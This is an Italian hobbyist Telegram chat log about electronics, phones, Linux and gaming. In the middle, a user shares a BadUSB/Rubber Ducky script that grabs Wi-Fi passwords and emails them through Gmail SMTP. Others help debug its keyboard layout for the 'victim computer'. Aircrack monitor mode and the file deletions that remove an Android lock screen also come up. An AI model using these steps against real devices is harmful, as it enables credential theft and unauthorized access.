Ce l'ho fatta 
?
Sethbling è riuscito a ricreare il linguaggio Basic in Minecraft
WTFF??D=?)(S=?)(D=SAIPOAPL°KDS°LçF;K°PAK;D
solo che è come se andasse su un processore a 20Hz
visto che Minecraft è a 20tps
OMFGGGGG
no aspe
ma è malato di cervello questo
solo per il testo scritto coi banner
ehm
è Sethbling
tps sarebbero?
lo so chi è, ma anche per sethbling è malato di cervello
tick al secondo
ticks per second
ah cose di Minecraft
in realtà no
Qualcuno sa come risolvere (sono su Centos7)
guarda prima di chiedere cosa fosse ho pure cercato e sulla pagina di disambiguazione ho trovato tutto tranne che tic per secondo
sì 
i tps sono le volte che (in questo caso) il mondo di Minecraft si aggiorna al secondo
eh, quindi sono robe di mc
anche su csgo ci sono i tps
cambia che su csgo sono 64 e 128 nei tornei dell'ESL
e capisci che un gioco a 64tps richiede molta più precisione di un gioco a 20tps
Vabeh, chissene io comincio a fare robeh
quindi sparisco
io ho appena finito di impostare il mio controller PWM 3.0
lasciate perdere la gocciona di stagno sul D10, non si scioglieva più lo stagno e poi di botto mi ha formato quella gocciona.
Cosa vuoi fare con c4d?
coming soon... ;)
Oki
ora con l'aggiornamento si sono ridotti i costi (visto che siamo passati da un Raspberry Pi Zero W ad un Arduino Nano con un modulo radio) e non gli serve più il regolatore 12V -> 5V visto che l'Arduino ne ha uno integrato
Ok grazie:)
Ma è sicuro fare un caricabatterie per telefono con un alimentatore switching cinese?
Smartphone 250€ non cinesi?
"non cinesi" ovvero nessuno
Poi punta sui Samsung jqualcosa
Nel senso non Xiaomi e marche del genere
amazon...prenditi un galaxy s6 o s7, dovrebbero stare su quei prezzi li oramai
Tutti i cinesi sono prodotti in cina
No. S7 350 s6 non c'è piu
è?
Raga stavo cercando di fare il codice sulla rubberducky, ma da un errore ad un certo punto, quando gli faccio inserire dei caratteri, esempio: "/" o ":" me li scrive così "-" e "¢" qualcuno sa spiegarmi perché e come risolverlo?
l's6 costa 200
Dove?!
Lo so
cerchi su amazon "galaxy s6" e ne trovi 999
Ricondizionato
tipo this : 
Quanto sono odiosi gli ide per c++
360 nuovo
Non sono ancora riuscito ad importare la libreria sdl2
Ricondizionato
a beh, si, a sto punto prendi l's7 a quel prezzo nuovo, però vabò, non credo tu possa trovarci di molto a sto punto...punta sui galaxy j e vedi cosa trovi a sto punto
in realtà usato
tipo dev cpp?
Anche codeblocks
Cambia tutto
Ma perché 
Non é per me comunque
Gli ho dato tutte le directory e neanche le prende quando uso il wizard
Comprati un Motorola moto g5 plus
sattoh
k
Io ho un le max 2 
Meglio della merdaccia Samsung, meglio di uno smartphone di millanta anni fa
Motorola è una garanzia
Devo prendere l's8+ ops
Qualcuno che usa code blocks o che lo sa usare e che conosca c++?
Ma sì dai comprare un s6 che senso ha?
Togli il plus, però puoi dire addio ad avere l'ultima versione di patch e android eh
Ma cazzotene
Senza plus hai uno schifo di snapdragon 435
beh..per conoscere c++ ci sono, per usare code blocks...io ci ho rinunciato, preferisco dev cpp per scuola e visual studio per quando non mi serve per scuola
Con il plus ho sentito problemi con la fotocamera
Nah, il g5s plus è buono assai
Ok, bello...
Ma per importare una libreria di SDL
manco so cosa sia sdl
Basta mettere tutti i file .h nella cartella include del programma
Si, quello senza dubbi, ma come fotocamera è meglio il g5 normale
È una libreria per fare cose grafiche
Tu cosa usi?
Raga stavo cercando di fare il codice sulla rubberducky, ma da un errore ad un certo punto, quando gli faccio inserire dei caratteri, esempio: "/" o ":" me li scrive così "-" e "¢" qualcuno sa spiegarmi perché e come risolverlo?
beh, grafica+cpp....gud lac, è già un miracolo se riesci ad installare graphics.h senza che ti si bugghi tutto
Oh bello
di solito opencv
Ho provato qt ma mi sono subito cascate le palle
Dava già problemi di suo installato con l'installazione sua
Ok
ma non è "grafica" vera, è principalmente per image processing quindi...
Più che altro volevo prendere dei dati dalla porta seriale di Arduino e fare un grafico delle temperature
Quindi essenzialmente mette immagini tue.
aallora credo sia fattibilissimo con opencv, ho già in mente come fare in realtà
Ok
Ma c'è una funzione specifica o devo fare cose complesse?
non per forza, essenzialmente non è un motore grafico o altro, però finchè devi disegnare linee, grafici e cose così è buono
Ok allora siamo nel suo
cerca opencv su internet, sono 500MiB di funzioni brutali che fanno di tutto e di più
Ok non ho problemi di dimensioni a patto che i loro server scaricano ad una velocità almeno di 1MB/s
lo scarichi da github
il problema è installarlo, ti divertirai :D
Poi devo fare un procedimento extra o niente?
Mi viene già paura
ci vediamo tra 2 anni, quando ci sarai riuscito
Ma questo con github o sempre succede?
sempre e comunque, è la stessa cosa che scarichi, beh, hai un modo in realtà....usa visual studio come ide, opencv ha già le cartelle predisposte per vb14, puoi inserirlo senza tante storie in 2 minuti a patto che però tu usi visual studio
Tutto questo comunque è quando la gente idiota si mette a fare ide
Io visual studio non lo uso manco morto. Mi dava errore in file che erano funzionanti su codeblocks
Puzza di sudicio proprio
cosa centra?
no, sei semplicemente te che non riesci ad usarlo
Nono è fatto da scimmie radioattive
Vabbè ho capito, approfondisco JavaScript per ora 
no, sei te che non concepisci il cambio tra una versione e l'altra di cpp e magari scrivendo in una ti da errore piuttosto che in un altra perchè sono diverse le istruzioni....
Ah
Good
Appena ho tempo mi metto al lavoro
Però devi ammettere che devvare in c++ è una cosa più difficile che altro sotto l'aspetto degli ide
Per il resto è un linguaggio comunque mediamente difficile
in che senso? quando prendi in mano un ide usi quello e ti ci abitui....tipo io che è una tragedia usandone 2 di diversi mi viene da premere f5 o f11 sempre sull'ide sbagliato per compilare, apparte a quello ti ci abitui...
Nel senso che gli ide sono un po' complicati
Più che altro aiutano poco
Hola amigos
Vedi come sto sclerando io dietro ad una libreria di caccola
naah, cosa ti serve che facciano qualcosa...a te basta scrivere, e compilare...fine...
prova con assembly una volta tanto
Scusa Mega tu per scrivere un codice ti trovi meglio con un foglio di testo ?
Ed importare
Perché dovrei scrivere un codice che su altri microprocessori non funziona? Per masochismo? No grazie 
vabb, quello ti basta 
 di solito, se sono librerie esterne te le metti nella stessa cartella e le usi così
Eh ho fatto così pure con codeblocks
Però non le prende
ma giusto per vedere se riesci ad eseguire quello che hai scritto
Honor 7 qualcosa su Amazon
Alla fine prende l'a5
Ah io non adoro quella serie
Manco io
Manco la j
Nono vai di moto G
Ho avuto per più di due anni il motoG 2014 (con uno snapdragon 400)... E beh davvero bello
Sera
'sera
ciao atutt
ciao a tutti di che si parla
buonasera a tutti
Raga qualcuno che ha un pdf di un libro di fisica 1 con esercizi svolti e commentati?
Eheh
Hai mr robot?
come si fa in un gruppo di amatori a parlare di hacking industriale??? un conto è scrivere in c++ " Hello World!", discorso diverso invece è ottenere l' IP dal proprio PC!!
Di cosa stai parlando scusa?
siamo modesti su
Mr Robot è per veri hacker industriali, è un dogma, punto.
Ma scusa......se io sono interessato a l'episodio di mr robot non vedo il problema
si ma devi avere l' umiltà di dire " non sono un hacker industriale pertanti migliorerò pur di visionarla anche io"! ci sono passato anche io nella tua situazione 

Sicuri di star bene?
Ma chi ha detto che mi considero hacker?!
PS: non uso Kali ☺️
s/robot/lamer
ragazzi la via per diventare hacker è utilizzare i programmi che girano da 2 anni su telegram
fidatevi
La serie è bella, non puoi dire nulla
Ok, bel troll 
Beh si, e' fatta bene se e' per quello
chissene fotte programmare, intanto ci sono già i robot che programmano!
Anche la trama è bella
Tutto è bello
La voce di uccellone
A me piace, cazzo mene dei pregiudizi
Ma porco giuda
Da quando i meme non sono autorizzati?
Raga qualcuno esperto con Linux?
Esperto no
Che problema?
Praticamente ho installato arch sul pc ma non riesco a far ripartire Windows
Ahahahahah
Hai una live usb?
Di Arch si
No
Adesso sei su arch?
Si
Installato sul pc
Installa gparted
Dovrei avere una live di gparted
Non ho chiesto una live gparted
Install gparted
Ok aspe come connetto a internet?
Che significa?
Avendo un driver di rete funzionante 
Manda la foto della home
Ahahahah
Daiii che devi studiare inglese
?
Ma allora....
Ah manco il desktop hai messo
Che problemi hai?
Ma infatti
Why?
Non hai installato arch
Si
Ma porca.....
Ti dico di no
Hai solo avviato la live
Avvio il pc senza usb, faccio login e tutto?
Funziona 
Si
No vabbè
Studia cos'è una live
Mi ricorda me da piccolo
Ieri?
Il boot order settato male e ogni riavvio ripartiva da capo l'installazione di Windows, e calcola che Windows durante l'installazione si riavvia più volte
Nono anni fa
Ma se lui è quanto me!
Si ma mo come faccio 
Io l'ho eliminato per sbaglio quindi...
Stai fermo
Ok
Faresti solo danni
Windows? Idem la prima volta che ho installato Ubuntu
Lo so, è per questo che sono qui
Poi però con gli anni ho capito che Linux al momento non fa per me
Prima di tutto usa una live Easy
Io con arch
In che senso 
Come mai?
Credo di averlo capito questa notte io 
Entra in Windows e formatta la chiavetta con arch
Basta pensare alle due cose principali che faccio col mio PC
Non considerare più arch per il momento
Come ci entro in Windows
Porno e programmare?
Gaming e developement
È quello il fottuto problema
Per il gaming Windows è d'obbligo
Stacchi la live arch e riaccendi
Vero
Per programmare C# Windows è 100 volte più comodo
Su questo non ne ho idea
Perché la versione di Visual Studio per Windows è qualcosa di aww
Non lo posso sentire
Non programmo in C#
Non ho la usb collegata da almeno 20 min
Vado di atom
E ti parte direttamente arch?
Mentre Visual Studio Code (che gira pire su MAC e Linux) ha molti meno tools
Si
Prima grub e poi arch
Perché non hai mai provato un IDE
Entra nel BIOS
Ok
Arduino 
Non è un IDE vero e proprio
Fatto mo?
Foto
Manca di intellisense, autocompletamento, correzione degli errori...
Se non ti muovi ti abbandono che ho Sonno
Sei tu lo sviluppatore 
?
Ehhh
Te hai un assemblato?
Cos?
Switchando scritto con un editor senza intellisense e senza il debug in tempo reale non so se sarebbe mai esistito
Sì da me
Vedi al tizio
Il BIOS a me è molto diverso
E ormai pure il mio portatile è un assemblato viste le volte che l'ho smontato
Ahahahahah
Ci hai messo la SSD?
È il classico UEFI di MSi
Anche
Che non ho
Ma ho pure sistemato la dissipazione a modo mio
In che senso?
Che devo cercare?
L'ordine di avvio Delle partizioni
L'ho portato da una media di *temperatura più alta del limite massimo che legge il sensore* a una media di 70°C
Non lo trovo
Se non lo conosci tu il tuo PC!
Ma è quello lì
C'è scritto boot priority
Ho usato anche mobo MSi con quel BIOS, anche se la mia cara ASRock è completamente diversa
Asus for life
Senti
Togli la chiavetta
E accendi
Vuoi capire che non posso sentire?
Vedi che succede
Già fatto
Già fatto da anni
L'ho già detto
E?
Cosa boota
Arch
Arch ha detto
Ma che hai fatto con arch
Con grub ma senza Windows su grub?
Esatto
Deve mettere una live USB Linux
Per fare?
Vedere le partizioni
Non lo può fare da Arch?
Già fatto
Teoricamente si
Ma meglio farlo con grafica per evitare danni
Aspé
Usa una live
Gparted (che almeno lo so usare)
Sicuro di non aver eliminato Windows
Beh c'è una partizione NTFS se vedi
Si, è il primo in alto 101 gb
Ma hai dato solo 5GB ad Arch wtf
Ah, vista
Quello ho 
La vera domanda è...... come ci è arrivato?
Eh Madonna almeno 20GB
Usi la fottutissima live?
Troppo swap comunque
C'è scritto 5G
Vabbè ma tipo mo che faccio attacco la live di gparted?
E allora?
Io dico come l'ha installata
Si
Ed elimina swap e partizione di arch
Tirati un pugno e studia
Ok
Non fare danni
 sei d'accordo?
Non chiedere a me
Mi sembra l'unica soluzione al momento
Perché?
Perché non saprei
Io non capisco se l'ha installata o meno
 prima controlla se hai effettivamente la partizione
Si la tengo
Poi pensaci, chiedi, e vedi se ti sembra il caso di proseguire
Io vado notte
Buonanotte, grazie mille
Ma.... è un protagonista di una serie, mica un hacker
Se vuoi andare avanti così tutto il giorno non so quanto duri qua  Ti ricordo che
1. I robot non programmano da soli
2. Come funzionano i robot? Forse qualcun'altro li ha progranmati prima, non credi?
HAHAHAHAAHAHAHAHAHAAHAHAHHA
c'è Transcriber Bot apposta 
Se solo azzeccasse
È un troll
Risolto alla fine?
HAHAHAHAHHAHAHAHAHHAHAHAHAHAHAHAHAHAHAHAH
La mano mi ha pure warnato per quel post 🤦‍♂️
Io ti avrei consigliato di copiare la partizione di Windows a questo punto
Fallo in processing
Sei un danno
qualcuno mi consiglia uno schermo touch per raspberry sotto i 30€ che vada con l'HDMI  e USB e non con i gpio perché mi servono
Mm non saprei 
ho trovato questo peró costa un po' troppo però usa hdmi e usb
Oh Gesù
OH GESÙ
Ragazzi qualcuno si è mai cimentato nel tentativo di "overclockare" (passatemi il termine) l'antenna esterna Linkem ?

Per esempio si potrebbe creare qualcosa di analogo ad una C-Antenna ?
O collegare da qualche parte un'antenna esterna ?


 ti taggo perché come radioamatore spakki 

 se ci riusciamo, fai un super video da mega ClickBait 
Buongiorno
Analisi tirano fuori gli integrali
 e tu chi hai votato?
Casey Neistat del partito Noi Su Youtube
Bellissima
Diipende da cosa intendi...overclockare un'antenna non vuol dire niente, è solo un pezzo di ferro quella, se intendi cambiare la frequenza del modem è impossibile...nel senso che il modem stesso è fatto per andare a quella frequenza
Fisicamente è fatto così, non è una specie di arduino con la possibilità di scegliere
Si Giulian, overclockare era scherzoso, intendevo potenziare la portata in modo da avere il segnale e la qualità del link al massimo
Se non sbaglio dovrebbe andare sulle frequenze dell'LTE, secondo me qualcosiana si può fare ma chiedo a te che sei il vero esperto
Mmhh...capisco...beh, se intendi del modem non credo tu possa fare tantissimo, se intendi di ricezione allora puoi modificare una parabolica
Ahhh interessante

Intendi usare una parabola e mettere l'antenna linkem al posto dell'occhio ?
Nel senso che come scheda wifi alla fine ci attacchi proprio una parabola moddata, riesci a ricevere ad una bella distanza così
Nono non il modem, quello è intoccabile, il computer a cui serve internet intendo
Uhm non ti seguo

Per sicurezza ti spiego come è fatto un impianto Linkem

C'è un modem/router wifi interno, collegato con cavo ethernet ad uno scatolotto esterno che ha 4 porte ethernet che funge da antenna, infatti puntandolo più o meno bene si riesce a migliorare la ricezione
Sisi no ma intendo, tu il pc lo connetti a internet non solo via ethernet ma anche via wifi e quello lo puoi toccare, la ricezione con la linea la puoi migliorare ma sarebbe controproducente, sarebbe instabile probabilmente...e quindi non saprei, comunque potresti migliorare l'antenna, quello semmai
Ora non so che antenna abbia ma al massimo se ne può improvvisare una migliore con un po' di conti sulle onde che trasmette
Diciamo che la parte wifi casalinga non ha problemi, quello che sarebbe da migliorare è la parte che riguarda la connessione LTE
Si sarebbe perfetto
ehm... come si fà ?
E quella non so quanto sarebbe toccabile...forse puoi migliorare l'antenna ma devi 1 sapere che antenna usa e 2 probabilmente è già perfetta quella
Uhm Capisco

Ma una specie di C-Antenna direzionale potrebbe avere senso secondo te ?
Perchè probabilmente è già della lunghezza della proporzione giusta e quindi...semmai trova un punto migliore dove metterla o cose così
Non troppo..almeno, adesso ha su una parabola?
No niente parabola è un semplice rettangolo da orientare alla meno peggio
E allora 1 forse ho capito cosa sia e 2 io non lo toccherei, tanto di meglio non fai...è robba satellitare, è dura fare di meglio mi sa
No non satellitare, si punta verso antenne terrestri, quelle di telefonia cellulare
A quanto ti va?
Mmhh..allora forse dentro c'ha una antenna, si potrebbe dare un'occhiata a quello
Se riesci ad attaccargli una parabola a quell'antenna che sta dentro e poi punti alla trasmittente lte dovrebbe andare, anche solo per fare un tentativo
A me dopo due mesi ha iniziato ad andare a 0.01
Ok faccio un paio di ricerche sul web x vedere se c'è l'antenna smontata e vedo se individuo esattamente l'antenna reale
Hai provato a puntarla nuovamente ?
Si, faceva sempre schifo ed ho disdetto
Vabb ma l'antenna capisci subito qual'è in teoria, dovrebbe essere un cavetto anche abbastanza lungo di solito lo lasciano
Per completezza
Momento 
...
Oggi 18.30 tutti quelli in zona Trento.. Avete la possibilità di ascoltare, al dipartimento di Economia, un uomo fantastico che parla di scienza, una persona che ti fa pendere dalle sue labbra mentre parla: Franco Dalfovo, professore di Fisica a unitn
ah, pensavo stessi parlando di te stesso 
Nono
Di lui
è un antenna radio quella, funziona tramite ponte radio BTS
è normale, hai il ponte BTS della tua zona saturo..è come con l'FTTC, più allacci ci sono, peggio va
 
 rosic mode on 
Ahhaha
Si sapeva
bella bestiolina poi il caricatore multiplo è spettacolare
Come si fa a massimizzare la coppia dei motori passo passo (quelli piccoli che danno nei kit di arduino per capirci)?
Aumentando il voltaggio?
Mi è arrivato il mini arduino. Questi due così a cosa servono ?
Sono i pin da saldare (se vuoi)
Quanto lo hai pagato?
6$
Troppo
Mi sarei aspettato 0.12 euro
Dopo che Marco ha fatto il video i prezzi sono schizzati 
Erano alti anche prima
Su AliExpress costava più di 4€
Più di un arduino nano
Io il pro micro lo ho pagato un euro
Dove?
Wish
Era gratis, ho pagato solo un euro di spedizione ciascuno
Io non l’ho trovato :c
Primo pacco: arrivato
Ho trovato un Script per rubare le password della Wifi e poi inviarle via email
STRING $ReportEmail.From = '
'
ENTER
STRING $ReportEmail.To.Add('
')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
Qui cosa devo sostituire il ('
') con il mio indirizzo e basta ?
Penso di si, prova e nel caso lo cambi
Sito?
Why?
Non si legge niente
Azdelivery
Non mi trova la libreria <Keyboard.h>
Scaricala
Dipende dal tipo di Arduino che usi.. nelle impostazioni cambialo
Arduino Leonardo
A ok va

Appena si esegue lo Script e apre il terminale per mandare il file invece di scrivere le "@" mette questi " e invece di scrivere le ' mette le à
Può essere per la tastiera italiana ?

 ‎€1‎5.‎75‎ i‎nv‎ec‎e ‎ch‎e ‎€2‎6.‎69
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 4‎1.‎00%
⭐️‎ 4‎.9‎1 ‌‎/‌‎ ‎5.‎00‎ (‎77‎58‎ r‎ec‎en‎si‎on‎i)
 Store: Gearbest
 

Mica rischio la dogana? Tra PayPal e varie è arrivato a 20€
nono tranquillo
Okk
Sarebbe sopra i 23€ ma fino a 70-80€◘ se ne fregano
Meglio così
Anch'io...
Qualcuno sa se è possibile programmare uno smart contract che invii gli ETH ricevuti da una transazione a un altro wallet? Una cosa del tipo: ricevo 1 ETH sul mio address e questo viene istantaneamente inviato a un altro address
Sì pilotano in corrente
Volete vedere il cable management più ordinato di sempre?
scusate ragazzi ma esiste un sito dove c'è gente che cerca altra gente che faccia loro dei software? Non so se mi sono spiegato
Si ma avendo una resistenza interna aumentando la tensione aumenta anche la corrente
Però si surriscaldano veramente tanto
Usi un ponte h, un driver tipo 4988 o cosa?
basta chiedere su un forum ma ovviamente nessuno ti fa un programma gratis
sisi questo lo so, il fatto è che vorrei io per vari motivi allenarmi, perché non ho la carica emotiva giusta se mi dico di fare un programma da solo
Ho l’uln2003
GitHub 
puoi dire che sei disponibile per lavorare
Aspe ma devo preoccuparmi? Non ho mai usato gearbest pardon per le rotture
ah...
Semplicemente... Sensazionale!
Questo è quello che succede nel cmd quando inserisco l'arduino
PS C:\Users\franc\AppData\Roaming> $SMTPInfo ì New'Object Net.Mail.SmtpClient)$SmtpServer, 587=
» $SMTPInfo.EnableSsl ì $true
» $SMTPInfo.Credentials ì New'Object System.Net.NetworkCredential)àsender"gmail.comà, àsenderpassà=ò
» $ReportEmail ì New'Object System.Net.Mail.MailMessage
» $ReportEmail.From ì àsender"gmail.comà
In riga:1 car:11
+ $SMTPInfo ì New'Object Net.Mail.SmtpClient)$SmtpServer, 587=
+           ~
Token 'ì' imprevisto nell'espressione o nell'istruzione.
In riga:3 car:64
+ ... TPInfo.Credentials ì New'Object System.Net.NetworkCredential)àsender" ...
+                                                                 ~
Token ')' imprevisto nell'espressione o nell'istruzione.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : UnexpectedToken

PS C:\Users\franc\AppData\Roaming> $ReportEmail.To.Add)àreciever"gmail.comà=
» $ReportEmail.Body ì àHere Are The Wi'fi Passwordsà
» $ReportEmail.Attachments.Add)àpassword.txtà=
» $SMTPInfo.Send)$ReportEmail=
» exit
»
praticamente sostituisce i ' in à e le @ in "
Uno screen? 
Già
Aaah quetti bag
E come potrei risolvere ?
So che 
 stava smonando con l'arduino, mi diceva di cambiare la tastiera dalle impostazioni
si, è quella
metti l'americano
Quindi nel Computer vittima dovrei sempre cambiare la tastiera ?
yeep
oppure cambiare l'ascii map dell'header di keyboard.h inserendo nell'array i valori esadecimali della tastiera italiana...che però sono introvabili su internet
Non ho capito neanche una parola quindi cambio la lingua 
k
Apri il file keyboard.h e modifichi la mappatura della tastiera 
(?)
Lo sconto studenti sul sito ti oneplus vale solo per quelli all'università?
 ma quindi non ti danno neanche la cpu?
 le live falle venerdì e sabato così noi studenti non abbiamo problemi
Perché per esempio io domani devo studiare per il compito di matematica e non riesco a vederla
Sisi: CPU, mobo e psu
Anche il case in teoria ma non l'ho voluto
I7?
Sad 
GPU?
Concordo
Proporrei un ban Ed uno screen per ignuranza
Ahahahahahahahahah
La via per diventare lama è sputare
gienta...questa cosa, se io avessi tipo una stringa in cui ci stanno delle parentesi, come faccio a controllare se sono disposte giuste come fosse un'equazione?
Se sei sad lo puoi regalare xD
qua l'ho fatto con i vettori ma per quel che abbiamo studiato a scuola non li avremmo ancora fatti e domani c'ho verifica e probabilmente una delle richieste sarà una cosa del genere, come faccio senza usare i vettori?
non ho idee
Ma questo problema della tastiera c’è anche nella Ruber Ducky originale ?
?
Kek
non funziona come voglio farlo io ._.
tipo così, l'ultima parentesi la salta...perchè?
1060 6gb
Non il top ma pretty onesta
Meglio della 1050
E quindi i7 o i9?
Quello sicuro
oddio, ODDIO, un uguale di troppo, vado ad uccidermi
i7, vedi canale... Non so se posso spiegare la storia 🤔
SEEE funzionaaaaa
Bro.
I vettori.
Sul serio?
leggi quello che ho fatto ora senza, funziona
Per farla breve, a quella serata eravamo tutti troppo ubriachi e la memoria vacilla. I samples erogati sono diversi da quello che ci aspettavamo e quindi li abbiamo redistribuiti in modo diverso
Senza vettori?
con i vettori solo il controllo ho fatto...scusa èh ma mi ci sto abituando troppo
yep
te l'ho appena inviato, dagli un'occhiata, i vettori sono solo commentati, il pezzo nuovo è nella funzione control() non commentata
Si ho visto il canale ahah, è un casino quando si fa ubriacare Johnny Cash
Che marca?
Mi ricorda una serata devasto dove dovevo concludere un importante affare
Gigabyte
Approfittatene, che le GPU in questo periodo vanno via come il pane 
Ahhhhh questi miners
Miners Pakistani 
O tailandesi o dovunque siano
Che poi mettere delle GPU così su uno scooter è pericolosissimo
ATTENZIONE MI SERVE QUALCUNO VERAMENTE ESPERTO DI SONY VEGAS PRO 15!
(URGENTE, PAGO 5 EURO SE RISOLVETE IL PROBLEMA)


 
se vuoi te lo risolvo io
passa a Premiere
ora voglio 5€
Hahahahahahahaha stavo scrivendo la stessa cosa
ma anche mai
è difficilissimo
in realtà è più semplice
li ho provati entrambi
Costo?
no
se sapete aiutare con sony vegas bene senno no
ho avuto un canale YouTube per 4 anni e ho usato AWS Video Editor, Cyberlink Power Director (v12, 13 e 15), Sony Vegas Pro (12 e 13) e Premiere (2015 e 2017).
E ti posso dire che mi sono trovato meglio con Premiere, è stato anche il più veloce da imparare
Passa a premiere
Lo uso tutt'ora
Raga ma che cosa mi è successo al PC ? E acceso ma non si vede niente
mantieni premuto il tasto power fino a che non si spegne
iscritti?
Perché alla fine mi dice operazione non supportata ?
Perché la tua scheda di rete non supporta la monitor mode
Premiere>>>>>
Se non fosse adobe e non frizzasse ogni femtosecondo lo installerei anch'io, anche se farei soffrire il portatile
perche io ne ho 2700 ed ho sempre usato sony.
 ma io dico... Cosa lo mettono a fare aircrack nella versione per Raspberry di Kali se poi non si può usare
per usare una scheda esterna come tutti fanno?
Ah
Ehm
MLMLMLMLML
non ci sperare

Ok... Ho una scheda esterna, ora come la imposto per metterla in monitor mode ?
la attacchi al rasp, e poi usi aircrack usando lei, fai un ipconfig prima per vedere con che nome si interfaccia, se ti da errore pure con lei allora non può entrare nemmeno lei in monitor mode
Ma poi se la metto in monitor mode la posso togliere sta modalità ?
patch di marzo puntuali... Strano da parte di Samsung, deve esser successo qualcosa
Sapete come faccio a installare twrp se ho dimenticato il pin ?
(Android)
da quando ti chiede il pin per entrare in download mode / fastboot?
Comunque è stupendo "pago 5€"
a qualcuno di voi interessa un vps?
?
che vps?
La paga per il lavoro
windows
vCPU: 4
RAM: 8GB
HDD: 160GB o SSD: 80GB
Banda: 1Gbit
IP: 1 IPv4 + 1 IPv6
Virtualizzazione: KVM
scade fra 3 settimane (25/03)
 mmmm 
si ovvio
c'è qualcuno che sa se c'è un modo di disattivare i riavvi automatici di windows?
 mmmm 
 mm... ah no

che dite provo a ficcare 8 gb di ram in un macbook del 2010?
cos... funzionano ancora quei cosi? 
avoglia
MMMMMHHHANZZZZ
Io ho tutto Apple da sempre 
Android non capisco nulla 
Puoi spiegarmi per cortesia ?
sto coso va che e una bestia ancora ora
preso a 150 euro me lo hanno dato con 500gb di hdd , 4 di ram e sierra 10.12
pro di Apple per tutti i suoi dispositivi, del resto

dipende da device a device
(guarda un attimo sul gruppo)
e non e una truffa perche ce l ho davanti e sto scrivendo sti messaggi
visto visto
(ok)
Lg L5
provo?
VAdo sul sito della apple a vedere come si comporta la CPU
ammazza nuovo mi dicono
dipende... la ram devi comprarla o ce l'hai già?
ce le ho gia
pronte pronte
Me lo ha portato un cliente è del fratello che è morto e vogliono sbloccato il telefono perché non sanno il pin 
Per questo ci tengo a farlo
Se qualcuno mi aiuta ne sarei grato
cosi formattti tutto dalla recovery
password.key
pattern.key
locksettings.db
locksettings.db-shm
locksettings.db-wal
Se tolgo questi file si dovrebbe togliere solo la password
potresti provare a fare un backup della partizione data e trasferire sul pc il tar gz con tutto dentro
ho letto e lo posso portare fino a 16
ed e anche una a freq alta
rip
Sette anni di sfiga, se la Nutella si apre così 
Sono già 12 a comprare il formato piccolo
Sempre
esatto
io la comprai tempo fa a 150

 ‎€1‎69‎.9‎7 ‎in‎ve‎ce‎ c‎he‎ €‎20‎9.‎90
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 1‎9.‎02%
⭐️‎ 4‎.5‎0 ‌‎/‌‎ ‎5.‎00‎ (‎13‎9 ‎re‎ce‎ns‎io‎ni)
 

Certo certo, dietro al bar non c'è niente, vero? 
MA SEI SERIO? io mi divertivo a bucare la pellicola col coltello
Sette anni di sfiga, se la Nutella si apre così 
È quella Novi che è infinitamente più buona
Costa tipo il doppio ma non ha niente a che vedere... E comunque questo è l'unico formato
A me piace più la nutella sinceramente
E ci credo!
non è nutella, è crema novi ed è più buona della Nutella
Sette anni di sfiga, se la Nutella si apre così 
^^^
ma è quello che ha scritto 3 secondi fa 
ah non avevo visto
.
nono 
🤦‍♂️
Ragazzi, come avvio Arduino su Linux da terminale? L'ho installato e con la grafica lo apro normalmente, quando invece cerco di farlo da terminale non lo trova
Ti ho usato come utente follower 

proprio ieri si è finito il 3/4 barile di birra
Soldi buttati
nah
se piace la birra alla spina è veramente un ottimo acquisto
Sono riuscito a portare il mio Raspberry a 1330 MHz stabili!!
(Pi 3)
Wow
Usi dei dissipatori?
se prendo casa prendo la spina da birra
Impianto idraulico in giro per casa
Ogni stanza ha una valvola
Metti il bicchiere e esce la 
Wow
Figataaa un sistema cartesiano dal soffitto che ti riempie il bicchiere ovunque lo porgi
A comandi vocali
Spettacolare
Il voglio la serra con rolla mento automatico e con un drone che te la porta
Sapete che figata
Consegni in tutta la città 
Che figata

 Amazon Prime Air's First Customer Delivery - YouTube
Immagina la scena: voglio fumare ma non ho un cazzo... Con la app ti arriva il drone
Taccc
In che senso sistema cartesiano?
Cioè in questo contesto? 
Prima pensa alla casa 
Il sistema cartesiano funziona ovunque
Yea boyyyyyyyyyy
Tipo stampante 3D solo che al posto dell'hotend ha il tubo della birra
Bisogna vedere se c'è l'erba che mi interessa
ma lol
Shhh nessun finanziere qua in mezzo vero ?
Più o meno
Fuck
Aneddoto divertente time: mi hanno quasi attestato no clickbait !!1!1!!1
Mio cugino, mio padre, mia madre, mio fratello e mio zio fanno i finanzieri
Fuck fuck
Io scappo ciaoooo
Eskere
Non c'è più nessuno?
Figo ahah
Need traduzione
Son terrone io
meglio di così non si può

Meglio di così non si può
0,001 millisecondi prima
Cercavo il "brao mona" ma non c'è nello sticker pack 🤔
Mi è andata bene lol
Marco, ma nel gruppo li hai attivati gli sticker magici?
Yup
Forse 🤔
:c
Non va più 🤔
No ragazzi ho trovato uno sticker pack in dialetto bresciano 
Oh, chi è che ha eliminato mezza chat?
Ah bo
Btw Marco le gif
Vogliamo le gif
G I F WE NEED IT
Oddio per un attimo ho pensato fosse la mia gatta
❤️
Gif
Marcoh le gif
if (uomo || !esci(minne)) nope();
CAGAMI
Le gif
Wut
Wut appended
Lei è sopravvissuta
Diciamo che hai spammato parecchio
Ma allora le vedete le gif ?
Ecco non trovavo il pack
Nope
Solo nei log della chat
:c
Le vede solo il bot che ti muta

:c
E quelle che invia Marco
Rip
Tuo voip?
Nope
ma che cazz 
Bata sto spam
Sento odore di lamerino
Eh
Chi
Costui
Ah
Ma io non say
Fatto bene mi dicono
Beh Ubuntu... lavora gia' per la latitudine zero... Facendo un sofware gratuito per tutti....L'INFORMAZIONE GRATI PER TUTTI
Omg
¯\_(ツ)_/¯
Ma ma
Ma
Fack
Ma
Mu
Hahahkahl
Secondo quale logica tu stai scrivendo se sei stato mutato tre secondi fa per flood? 
L'ho smutato perché era appena entrato
Ahh k
Grazie
Comunque buonasera, sono un iscritto di overVolt da circa un anno
Buongiorno qualcuno sa dirmi perchè la badusb non legge la sd card. Non entra nella directory?
Benvenuto
Benvenuto
Anch'io sono iscritto a overVolt, è troppo bravo/figo/divertente
Ma ciao, hai totalmente ragione

adesso si che ti riconosco mi sembrava troppo ordinato il lavoro dell'altra volta
Comunque ti sei perso un pezzo
Quell'Arduino era difettato
È morto dopo qualche minuto
